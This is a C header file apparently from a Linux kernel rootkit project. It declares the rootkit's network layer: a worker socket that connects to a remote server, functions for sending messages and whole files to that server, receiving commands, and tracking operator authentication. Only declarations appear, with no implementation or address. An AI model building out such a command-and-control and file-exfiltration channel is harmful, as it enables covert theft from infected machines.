#ifndef NETWORK_H
#define NETWORK_H

#include <linux/inet.h>
#include <linux/socket.h>

#include "config.h"
#include "crypto.h"
#include "rootkit_command.h"

// socket.c
struct socket *get_worker_socket(void);
struct socket *set_worker_socket(struct socket *s);
int close_worker_socket(void);
int connect_worker_socket_to_server(struct sockaddr_in *addr);

// iostream.c
int send_to_server_raw(const char *data, size_t len); 	// Send a message to the server
int send_to_server(char *message, ...);					// Send a formatted message to the server
int receive_from_server(char *buffer, size_t len);		// Receive a message from the server
int send_file_to_server(char *filename); 				// Send a file to the server

// worker.c
bool is_user_auth(void);								// Check if the user is authenticated
int set_user_auth(bool auth);							// Set the user authentication status
int start_network_worker(void);							// Start the network worker thread
int stop_network_worker(void);							// Stop the network worker thread

#endif /*NETWORK_H*/